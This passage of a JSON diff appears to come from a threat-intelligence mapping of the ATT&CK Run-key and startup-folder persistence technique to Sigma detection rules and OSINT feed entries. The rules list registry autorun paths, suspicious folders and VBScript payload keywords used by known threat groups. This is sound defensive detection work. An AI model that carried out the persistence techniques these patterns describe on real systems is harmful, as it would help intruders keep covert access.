\\Microsoft\\Windows\\CurrentVersion\\Run\\aurora-dashboard\n  filter_ctfmon:\n    Details: ctfmon.exe /n\n    Image: C:\\Windows\\system32\\userinit.exe\n  filter_defender:\n    Image: C:\\Program Files\\Windows Defender\\MsMpEng.exe\n  filter_dropbox:\n    Details|endswith: A251-47B7-93E1-CDD82E34AF8B}\n    Image: C:\\Windows\\system32\\regsvr32.exe\n    TargetObject|contains: DropboxExt\n  filter_edge:\n    Image|startswith:\n    - C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\Install\\\n    - C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\\n    - C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\n  filter_everything:\n    Details|endswith: \\Everything\\Everything.exe\" -startup\n    TargetObject|endswith: \\Microsoft\\Windows\\CurrentVersion\\Run\\Everything\n  filter_googledrive1:\n    Details|contains: \\GoogleDriveFS.exe\n    Details|startswith: C:\\Program Files\\Google\\Drive File Stream\\\n    TargetObject|endswith: \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\GoogleDriveFS\n  filter_googledrive2:\n    Details:\n    - '{CFE8B367-77A7-41D7-9C90-75D16D7DC6B6}'\n    - '{A8E52322-8734-481D-A7E2-27B309EF8D56}'\n    - '{C973DA94-CBDF-4E77-81D1-E5B794FBD146}'\n    - '{51EF1569-67EE-4AD6-9646-E726C3FFC8A2}'\n    TargetObject|contains: GoogleDrive\n  filter_greenshot:\n    Details: C:\\Program Files\\Greenshot\\Greenshot.exe\n    TargetObject|endswith: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Greenshot\n  filter_itunes:\n    Details: '\"C:\\Program Files\\iTunes\\iTunesHelper.exe\"'\n    TargetObject|endswith: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\iTunesHelper\n  filter_logonui:\n    Image: C:\\Windows\\system32\\LogonUI.exe\n    TargetObject|contains:\n    - \\Authentication\\Credential Providers\\{D6886603-9D2F-4EB2-B667-1971041FA96B}\\\n    - \\Authentication\\Credential Providers\\{BEC09223-B018-416D-A0AC-523971B639F5}\\\n    - \\Authentication\\Credential Providers\\{8AF662BF-65A0-4D0A-A540-A338A999D36F}\\\n    - \\Authentication\\Credential Providers\\{27FBDB57-B613-4AF2-9D7E-4FA7A66C21AD}\\\n  filter_officeclicktorun:\n    Image|endswith: \\OfficeClickToRun.exe\n    Image|startswith:\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\\n  filter_onedrive:\n    Details|contains: \\AppData\\Local\\Microsoft\\OneDrive\\\n    Details|startswith:\n    - C:\\Windows\\system32\\cmd.exe /q /c rmdir /s /q \"C:\\Users\\\n    - C:\\Windows\\system32\\cmd.exe /q /c del /q \"C:\\Users\\\n  filter_opera:\n    Details: C:\\Program Files\\Opera\\assistant\\browser_assistant.exe\n    TargetObject|endswith: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Opera Browser\n      Assistant\n  filter_python:\n    Details|contains|all:\n    - \\AppData\\Local\\Package Cache\\{\n    - '}\\python-'\n    Details|endswith: .exe\" /burn.runonce\n    TargetObject|contains: \\Microsoft\\Windows\\CurrentVersion\\RunOnce\\{\n  filter_teams:\n    Details|contains: '\\Microsoft\\Teams\\Update.exe --processStart '\n    Image|endswith: \\Microsoft\\Teams\\current\\Teams.exe\n  filter_zoom:\n    Details: '\"C:\\Program Files\\Zoom\\bin\\installer.exe\" /repair'\n    TargetObject|endswith: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\zoommsirepair\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: 20f0ee37-5942-4e45-b7d5-c5b5db9df5cd\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/10/20\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\n- https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: CurrentVersion Autorun Keys Modification\n",
+                            "sigma:id": "20f0ee37-5942-4e45-b7d5-c5b5db9df5cd",
+                            "title": "CurrentVersion Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9c226817-8dc9-46c2-a58d-66655aafd7dc",
+                        "lookup_data": {
+                            "description": "Detect modification of the startup key to a path where a payload could be stored to be launched during startup",
+                            "raw": "author: frack113\ndate: 2022/10/01\ndescription: Detect modification of the startup key to a path where a payload could\n  be stored to be launched during startup\ndetection:\n  condition: selection\n  selection:\n    EventType: SetValue\n    TargetObject|contains: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User\n      Shell Folders\n    TargetObject|endswith: Startup\nfalsepositives:\n- Unknown\nid: 9c226817-8dc9-46c2-a58d-66655aafd7dc\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/9e5b12c4912c07562aec7500447b11fa3e17e254/atomics/T1547.001/T1547.001.md\nstatus: experimental\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1547.001\ntitle: Modify User Shell Folders Startup Value\n",
+                            "sigma:id": "9c226817-8dc9-46c2-a58d-66655aafd7dc",
+                            "title": "Modify User Shell Folders Startup Value",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "827e941e-4a99-4e2c-a578-bfcec2d40552",
+                        "lookup_data": {
+                            "description": "Malware analysis report on SparrowDoor malware",
+                            "link": "http://www.botvrij.eu/data/feed-osint/827e941e-4a99-4e2c-a578-bfcec2d40552.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1650959349",
+                            "uuid": "827e941e-4a99-4e2c-a578-bfcec2d40552",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "20c3f09d-c53d-4e85-8b74-6aa50e2f1b61",
+                        "lookup_data": {
+                            "description": "Detects suspicious inline VBScript keywords as used by UNC2452",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/03/05\ndescription: Detects suspicious inline VBScript keywords as used by UNC2452\ndetection:\n  condition: selection and not filter\n  filter:\n    CommandLine|contains: \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  selection:\n    CommandLine|contains|all:\n    - Execute\n    - CreateObject\n    - RegRead\n    - window.close\n    - \\Microsoft\\Windows\\CurrentVersion\nfalsepositives:\n- Unknown\nid: 20c3f09d-c53d-4e85-8b74-6aa50e2f1b61\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Suspicious VBScript UN2452 Pattern\n",
+                            "sigma:id": "20c3f09d-c53d-4e85-8b74-6aa50e2f1b61",
+                            "title": "Suspicious VBScript UN2452 Pattern",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "70d43542-cd2d-483c-8f30-f16b436fd7db",
+                        "lookup_data": {
+                            "description": "Detects registry key used by Leviathan APT in Malaysian focused campaign",
+                            "raw": "author: Aidan Bracher\ndate: 2020/07/07\ndescription: Detects registry key used by Leviathan APT in Malaysian focused campaign\ndetection:\n  condition: selection\n  selection:\n    TargetObject: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ntkd\nid: 70d43542-cd2d-483c-8f30-f16b436fd7db\nlevel: critical\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.elastic.co/blog/advanced-techniques-used-in-malaysian-focused-apt-campaign\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Leviathan Registry Key Activity\n",
+                            "sigma:id": "70d43542-cd2d-483c-8f30-f16b436fd7db",
+                            "title": "Leviathan Registry Key Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "02ee49e2-e294-4d0f-9278-f5b3212fc588",
+                        "lookup_data": {
+                            "description": "Detects suspicious new RUN key element pointing to an executable in a suspicious folder",
+                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Sander Wiebing\ndate: 2018/08/25\ndescription: Detects suspicious new RUN key element pointing to an executable in a\n  suspicious folder\ndetection:\n  condition: all of selection_*\n  selection_details:\n  - Details|contains:\n    - C:\\Windows\\Temp\\\n    - C:\\$Recycle.bin\\\n    - C:\\Temp\\\n    - C:\\Users\\Public\\\n    - C:\\Users\\Default\\\n    - C:\\Users\\Desktop\\\n    - \\AppData\\Local\\Temp\\\n    - '%temp%\\'\n    - '%tmp%\\'\n  - Details|startswith:\n    - '%Public%\\'\n    - wscript\n    - cscript\n  selection_target:\n    EventType: SetValue\n    TargetObject|contains:\n    - \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\n    - \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\\nfalsepositives:\n- Software using weird folders for updates\nfields:\n- Image\nid: 02ee49e2-e294-4d0f-9278-f5b3212fc588\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/09/13\nreferences:\n- https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: New RUN Key Pointing to Suspicious Folder\n",
+                            "sigma:id": "02ee49e2-e294-4d0f-9278-f5b3212fc588",
+                            "title": "New RUN Key Pointing to Suspicious Folder",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "46490193-1b22-4c29-bdd6-5bf63907216f",
+                        "lookup_data": {
+                            "description": "Detects VBScript content stored into registry keys as seen being used by UNC2452 group",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/03/05\ndescription: Detects VBScript content stored into registry keys as seen being used\n  by UNC2452 group\ndetection:\n  condition: selection and not 1 of filter*\n  filter:\n    TargetObject|contains: Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  filter_dotnet:\n    Details|contains:\n    - \\Microsoft.NET\\Primary Interop Assemblies\\Microsoft.mshtml.dll\n    - <\\Microsoft.mshtml,fileVersion=\n    - _mshtml_dll_\n    - <\\Microsoft.mshtml,culture=\n    Image|endswith: \\msiexec.exe\n    TargetObject|contains: \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\\n  selection:\n    Details|contains:\n    - 'vbscript:'\n    - 'jscript:'\n    - mshtml,\n    - RunHTMLApplication\n    - Execute(\n    - CreateObject\n    - window.close\n    EventType: SetValue\n    TargetObject|contains: Software\\Microsoft\\Windows\\CurrentVersion\nfalsepositives:\n- Unknown\nid: 46490193-1b22-4c29-bdd6-5bf63907216f\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/09/19\nreferences:\n- https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: VBScript Payload Stored in Registry\n",
+                            "sigma:id": "46490193-1b22-4c29-bdd6-5bf63907216f",
+                            "title": "VBScript Payload Stored in Registry",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a80f662f-022f-4429-9b8c-b1a41aaa6688",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: ie and ie_details and not 1 of filter_*\n  filter_empty:\n    Details: (Empty)\n  filter_extensions:\n    TargetObject|contains:\n    - \\Extensions\\{2670000A-7350-4f3c-8081-5663EE0C6C49}\n    - \\Extensions\\{31D09BA0-12F5-4CCE-BE8A-2923E76605DA}\n    - \\Extensions\\{789FE86F-6FC4-46A1-9849-EDE0DB0C95CA}\n    - \\Extensions\\{A95fe080-8f5d-11d2-a20b-00aa003c157a}\n  filter_toolbar:\n    TargetObject|endswith:\n    - \\Toolbar\\ShellBrowser\\ITBar7Layout\n    - \\Toolbar\\ShowDiscussionButton\n    - \\Toolbar\\Locked\n  ie:\n    EventType: SetValue\n    TargetObject|contains:\n    - \\Software\\Wow6432Node\\Microsoft\\Internet Explorer\n    - \\Software\\Microsoft\\Internet Explorer\n  ie_details:\n    TargetObject|contains:\n    - \\Toolbar\n    - \\Extensions\n    - \\Explorer Bars\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: a80f662f-022f-4429-9b8c-b1a41aaa6688\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: obsoletes\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Internet Explorer Autorun Keys Modification\n",
+                            "sigma:id": "a80f662f-022f-4429-9b8c-b1a41aaa6688",
+                            "title": "Internet Explorer Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b29aed60-ebd1-442b-9cb5-16a1d0324adb",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: all of selection_wow_current_version_* and not 1 of filter_*\n  filter_dotnet:\n    Details|endswith: .exe\" /burn.runonce\n    Details|startswith: '\"C:\\ProgramData\\Package Cache\\'\n    Image|contains: \\windowsdesktop-runtime-\n    TargetObject|endswith:\n    - \\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\{e2d1ae32-dd1d-4ad7-a298-10e42e7840fc}\n    - \\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\{7037b699-7382-448c-89a7-4765961d2537}\n  filter_dropbox:\n  - Details|endswith: -A251-47B7-93E1-CDD82E34AF8B}\n  - Details: grpconv -o\n  - Details|contains|all:\n    - C:\\Program Files\n    - \\Dropbox\\Client\\Dropbox.exe\n    - ' /systemstartup'\n  filter_edge:\n    Image|contains|all:\n    - C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\Install\\{\n    - \\setup.exe\n  filter_empty:\n    Details: (Empty)\n  filter_evernote:\n    TargetObject|endswith: \\Explorer\\Browser Helper Objects\\{92EF2EAD-A7CE-4424-B0DB-499CF856608E}\\NoExplorer\n  filter_ms_win_desktop_runtime:\n    Details|startswith: '\"C:\\ProgramData\\Package Cache\\{d21a4f20-968a-4b0c-bf04-a38da5f06e41}\\windowsdesktop-runtime-'\n  filter_msiexec:\n    Image: C:\\WINDOWS\\system32\\msiexec.exe\n    TargetObject|contains: \\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\\n  filter_msoffice1:\n    Image: C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe\n    TargetObject|contains: \\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\\n  filter_msoffice2:\n    Image:\n    - C:\\Program Files\\Microsoft Office\\root\\integration\\integrator.exe\n    - C:\\Program Files (x86)\\Microsoft Office\\root\\integration\\integrator.exe\n    TargetObject|contains: \\Explorer\\Browser Helper Objects\\{31D09BA0-12F5-4CCE-BE8A-2923E76605DA}\\\n  filter_office:\n    Image|endswith: \\OfficeClickToRun.exe\n    Image|startswith:\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\\n    - C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\\n  filter_uninstallers:\n    Image|startswith: C:\\Windows\\Installer\\MSI\n    TargetObject|contains: \\Explorer\\Browser Helper Objects\n  filter_upgrades:\n    Details|endswith: ' /burn.runonce'\n    Image|contains:\n    - \\winsdksetup.exe\n    - \\windowsdesktop-runtime-\n    - \\AspNetCoreSharedFrameworkBundle-\n    Image|startswith:\n    - C:\\ProgramData\\Package Cache\n    - C:\\Windows\\Temp\\\n  filter_vcredist:\n    Details|endswith: '}\\VC_redist.x64.exe\" /burn.runonce'\n    Image|endswith: \\VC_redist.x64.exe\n  selection_wow_current_version_base:\n    EventType: SetValue\n    TargetObject|contains: \\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\n  selection_wow_current_version_keys:\n    TargetObject|contains:\n    - \\ShellServiceObjectDelayLoad\n    - \\Run\\\n    - \\RunOnce\\\n    - \\RunOnceEx\\\n    - \\RunServices\\\n    - \\RunServicesOnce\\\n    - \\Explorer\\ShellServiceObjects\n    - \\Explorer\\ShellIconOverlayIdentifiers\n    - \\Explorer\\ShellExecuteHooks\n    - \\Explorer\\SharedTaskScheduler\n    - \\Explorer\\Browser Helper Objects\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: b29aed60-ebd1-442b-9cb5-16a1d0324adb\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\n- https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Wow6432Node CurrentVersion Autorun Keys Modification\n",
+                            "sigma:id": "b29aed60-ebd1-442b-9cb5-16a1d0324adb",
+                            "title": "Wow6432Node CurrentVersion Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "480421f9-417f-4d3b-9552-fd2728443ec8",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: wow_nt_current_version_base and wow_nt_current_version and not filter\n  filter:\n    Details:\n    - (Empty)\n    - \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution\n      Options\n  wow_nt_current_version:\n    TargetObject|contains:\n    - \\Windows\\Appinit_Dlls\n    - \\Image File Execution Options\n    - \\Drivers32\n  wow_nt_current_version_base:\n    EventType: SetValue\n    TargetObject|contains: \\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: 480421f9-417f-4d3b-9552-fd2728443ec8\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/11/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Wow6432Node Windows NT CurrentVersion Autorun Keys Modification\n",
+                            "sigma:id": "480421f9-417f-4d3b-9552-fd2728443ec8",
+                            "title": "Wow6432Node Windows NT CurrentVersion Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "92fa78e7-4d39-45f1-91a3-8b23f3f1088d",
+                        "lookup_data": {
+                            "description": "Attempts to detect PowerShell writing startup shortcuts.\nThis procedure was highlighted in Red Canary Intel Insights Oct. 2021, \"We frequently observe adversaries using PowerShell to write malicious .lnk files into the startup directory to establish persistence.\nAccordingly, this detection opportunity is likely to identify persistence mechanisms in multiple threats.\nIn the context of Yellow Cockatoo, this persistence mechanism eventually launches the command-line script that leads to the installation of a malicious DLL\"\n",
+                            "raw": "author: Christopher Peacock '@securepeacock', SCYTHE\ndate: 2021/10/24\ndescription: 'Attempts to detect PowerShell writing startup shortcuts.\n\n  This procedure was highlighted in Red Canary Intel Insights Oct. 2021, \"We frequently\n  observe adversaries using PowerShell to write malicious .lnk files into the startup\n  directory to establish persistence.\n\n  Accordingly, this detection opportunity is likely to identify persistence mechanisms\n  in multiple threats.\n\n  In the context of Yellow Cockatoo, this persistence mechanism eventually launches\n  the command-line script that leads to the installation of a malicious DLL\"\n\n  '\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    TargetFilename|contains: \\start menu\\programs\\startup\\\n    TargetFilename|endswith: .lnk\nfalsepositives:\n- Unknown\n- Depending on your environment accepted applications may leverage this at times.\n  It is recommended to search for anomalies inidicative of malware.\nid: 92fa78e7-4d39-45f1-91a3-8b23f3f1088d\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/08/10\nreferences:\n- https://redcanary.com/blog/intelligence-insights-october-2021/\n- https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1547.001/T1547.001.md#atomic-test-7---add-executable-shortcut-link-to-user-startup-folder\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: PowerShell Writing Startup Shortcuts\n",
+                            "sigma:id": "92fa78e7-4d39-45f1-91a3-8b23f3f1088d",
+                            "title": "PowerShell Writing Startup Shortcuts",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "2aa0a6b4-a865-495b-ab51-c28249537b75",
+                        "lookup_data": {
+                            "description": "A General detection for files being created in the Windows startup directory. This could be an indicator of persistence.",
+                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/05/02\ndescription: A General detection for files being created in the Windows startup directory.\n  This could be an indicator of persistence.\ndetection:\n  condition: selection and not filter_update\n  filter_update:\n  - Image: C:\\Windows\\System32\\wuauclt.exe\n  - TargetFilename|startswith: C:\\$WINDOWS.~BT\\NewOS\\\n  selection:\n    TargetFilename|contains: \\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\nfalsepositives:\n- FP could be caused by legitimate application writing shortcuts for example. This\n  folder should always be inspected to make sure that all the files in there are legitimate\nid: 2aa0a6b4-a865-495b-ab51-c28249537b75\nlevel: medium\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/10/07\nreferences:\n- https://github.com/OTRF/detection-hackathon-apt29/issues/12\n- https://threathunterplaybook.com/evals/apt29/detections/5.B.1_611FCA99-97D0-4873-9E51-1C1BA2DBB40D.html\nrelated:\n- id: 28208707-fe31-437f-9a7f-4b1108b94d2e\n  type: similar\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: Startup Folder File Write\n",
+                            "sigma:id": "2aa0a6b4-a865-495b-ab51-c28249537b75",
+                            "title": "Startup Folder File Write",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "046218bd-e0d8-4113-a3c3-895a12b2b298",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: session_manager_base and session_manager and not filter\n  filter:\n    Details: (Empty)\n  session_manager:\n    TargetObject|contains:\n    - \\SetupExecute\n    - \\S0InitialCommand\n    - \\KnownDlls\n    - \\Execute\n    - \\BootExecute\n    - \\AppCertDlls\n  session_manager_base:\n    EventType: SetValue\n    TargetObject|contains: \\System\\CurrentControlSet\\Control\\Session Manager\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: 046218bd-e0d8-4113-a3c3-895a12b2b298\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: obsoletes\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\n- attack.t1546.009\ntitle: Session Manager Autorun Keys Modification\n",
+                            "sigma:id": "046218bd-e0d8-4113-a3c3-895a12b2b298",
+                            "title": "Session Manager Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d8c0c469-2d3e-437a-80a1-a38bfe5998e8",
+                        "lookup_data": {
+                            "description": "IndigoZebra APT continues to attack Central Asia with evolving tools",
+                            "link": "http://www.botvrij.eu/data/feed-osint/d8c0c469-2d3e-437a-80a1-a38bfe5998e8.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1625229668",
+                            "uuid": "d8c0c469-2d3e-437a-80a1-a38bfe5998e8",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e7a2fd40-3ae1-4a85-bf80-15cf624fb1b1",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                            "raw": "author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin,\n  oscd.community, Tim Shelton, frack113 (split)\ndate: 2019/10/25\ndescription: Detects modification of autostart extensibility point (ASEP) in registry.\ndetection:\n  condition: scripts_base and scripts and not filter\n  filter:\n    Details: (Empty)\n  scripts:\n    TargetObject|contains:\n    - \\Startup\n    - \\Shutdown\n    - \\Logon\n    - \\Logoff\n  scripts_base:\n    EventType: SetValue\n    TargetObject|contains: \\Software\\Policies\\Microsoft\\Windows\\System\\Scripts\nfalsepositives:\n- Legitimate software automatically (mostly, during installation) sets up autorun\n  keys for legitimate reason\n- Legitimate administrator sets up autorun keys for legitimate reason\nfields:\n- SecurityID\n- ObjectName\n- OldValueType\n- NewValueType\nid: e7a2fd40-3ae1-4a85-bf80-15cf624fb1b1\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md\n- https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\n- https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d\nrelated:\n- id: 17f878b8-9968-4578-b814-c4217fc5768c\n  type: obsoletes\nstatus: test\ntags:\n- attack.persistence\n- attack.t1547.001\ntitle: System Scripts Autorun Keys Modification\n",
+                            "sigma:id": "e7a2fd40-3ae1-4a85-bf80-15cf624fb1b1",
+                            "title": "System Scripts Autorun Keys Modification",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d6c2ce7e-afb5-4337-9ca4-4b5254ed0565",
+                        "lookup_data": {
+                            "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
